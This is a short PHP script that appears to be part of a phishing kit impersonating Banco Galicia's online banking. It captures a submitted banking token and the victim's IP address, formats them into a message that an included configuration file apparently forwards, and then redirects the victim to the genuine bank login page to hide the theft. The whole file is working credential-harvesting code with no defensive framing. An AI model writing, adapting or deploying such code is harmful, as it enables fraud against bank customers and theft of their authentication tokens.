<?php  
if (isset($_POST['variable'])) {
  $enviara =
    "<b> ## Token galicia ## </b>\n".
    "<b>Direccion IP: </b> ".$_SERVER['REMOTE_ADDR']."\n".
    
    "<b>TOKEN: </b> <code>".$_POST['da']."</code>\n";    
    $enviar =  urldecode($enviara);
    include 'configure.php';
    header("location:https://onlinebanking.bancogalicia.com.ar/login");
}?>